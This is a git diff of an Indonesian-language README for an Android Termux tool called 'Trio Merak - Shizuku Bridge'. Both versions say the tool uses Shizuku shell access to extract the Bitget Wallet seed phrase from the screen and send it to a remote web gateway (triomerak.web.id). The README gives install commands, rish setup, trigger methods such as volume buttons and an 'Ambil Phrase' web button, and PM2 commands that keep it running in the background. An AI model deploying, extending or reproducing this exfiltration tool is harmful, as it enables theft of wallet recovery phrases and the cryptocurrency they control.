@@ -1,86 +1,68 @@
-# 🌉 Trio Merak - Shizuku Bridge for Android
+﻿# 🌉 Trio Merak - Shizuku Bridge for Android
 
-Jembatan otomatisasi Shizuku di HP Android untuk ekstrak seed phrase Bitget Wallet dan kirim ke Web Server Gateway. Berjalan 24/7 via PM2 di background Termux.
+Jembatan otomatisasi Shizuku di HP Android untuk ekstrak seed phrase Bitget Wallet dan kirim ke Web Server Gateway.
 
-## 🚀 Quick Start
+## 🚀 Install & Run
 
-### Install & Run
 ```bash
-pkg update -y && pkg install -y git python && git clone https://github.com/Imammaulidy/bridge.git && cd bridge && bash run.sh
+pkg update -y && pkg install -y git python
+git clone https://github.com/Imammaulidy/bridge.git
+cd bridge
+bash run.sh
 ```
 
-Pilih **[1] ALL-IN-ONE** dari menu → Bridge otomatis install dependensi & running.
+Pilih **[1] ALL-IN-ONE** → Bridge otomatis install & running.
 
-### Update
+## 📋 Prasyarat
+
+1. **Termux** - [F-Droid](https://f-droid.org/packages/com.termux/) (jangan Play Store)
+2. **Shizuku** - [GitHub](https://github.com/RikkaApps/Shizuku/releases)
+   - Start Shizuku → Authorized apps → Centang Termux
+3. **Setup rish:**
+   ```bash
+   cp /sdcard/Android/data/moe.shizuku.privileged.api/files/rish* $PREFIX/bin/
+   chmod +x $PREFIX/bin/rish
+   rish -c id  # Test (harus tampil uid=2000)
+   ```
+
+## ⚡ Cara Ekstrak
+
+- **Volume HP** → Timer 3s
+- **Enter Termux** → Timer 4s
+- **Web POS** → Instan
+
+## 🔧 Update & Maintenance
+
 ```bash
+# Update dari GitHub
 cd ~/bridge
 git pull origin main
 pm2 delete bridge
 pm2 start ecosystem.config.js
 pm2 save
-```
 
-### Reset Clean Install
-```bash
-pm2 delete bridge 2>/dev/null
-cd ~ && rm -rf bridge
-git clone https://github.com/Imammaulidy/bridge.git
-cd bridge
-pm2 start ecosystem.config.js
-pm2 save
-```
-
-## ⚡ Cara Ekstrak
-
-1. **Tombol Volume HP** → Buka Bitget Wallet di layar 12 kata → Tekan Volume Up/Down (timer 3s)
-2. **Enter di Termux** → Tekan Enter (timer 4s)
-3. **Web POS** → Klik tombol "Ambil Phrase" (instan)
-
-## 🐛 Debug Mode
-
-```bash
-cd ~/bridge
+# Debug mode
 export BRIDGE_DEBUG=1
 pm2 restart bridge
 pm2 logs bridge
+
+# Commands
+pm2 status          # Status
+pm2 logs bridge     # Log realtime
+pm2 restart bridge  # Restart
+bash run.sh         # Menu interaktif
 ```
 
-XML dump tersimpan di `~/last_dump.xml`
+## 🐛 Troubleshooting
 
-## 📋 Prasyarat
+**Error "rish command not found":**
+- Pastikan Shizuku running di HP
+- Cek authorized apps → Termux harus dicentang
+- Re-copy rish binary (lihat Setup rish di atas)
 
-1. **Termux** - Download dari [F-Droid](https://f-droid.org/packages/com.termux/) (jangan dari Play Store)
-2. **Shizuku** - Install dari [GitHub](https://github.com/RikkaApps/Shizuku/releases)
-   - Start Shizuku
-   - Authorized apps → Centang Termux
-3. **Setup rish binary:**
-   ```bash
-   cp /sdcard/Android/data/moe.shizuku.privileged.api/files/rish* $PREFIX/bin/
-   chmod +x $PREFIX/bin/rish
-   ```
-4. **Test koneksi:** `rish -c id` (harus tampil `uid=2000`)
-
-## 🔧 Commands
-
-```bash
-# Start dengan ecosystem config (recommended)
-cd ~/bridge
-pm2 start ecosystem.config.js
-pm2 save
-
-# Commands lainnya
-pm2 status              # Cek status
-pm2 logs bridge         # Lihat log
-pm2 restart bridge      # Restart
-pm2 reload ecosystem.config.js  # Reload config
-bash run.sh --status    # Via menu script
-```
-
-## 🆕 Changelog
-
-**v2.1** - Enhanced parser, debug mode, XML auto-save, better error messages  
-**v2.0** - Interactive menu, all-in-one installer, 4 parsing strategies
+**XML dump:** `~/last_dump.xml`
 
 ---
 
-**Gateway:** https://triomerak.web.id | **Issues:** [GitHub](https://github.com/Imammaulidy/bridge/issues)
+**v2.2** - Fixed rish detection (sh wrapper + stdout/stderr check + 25s timeout)  
+**Gateway:** https://triomerak.web.id
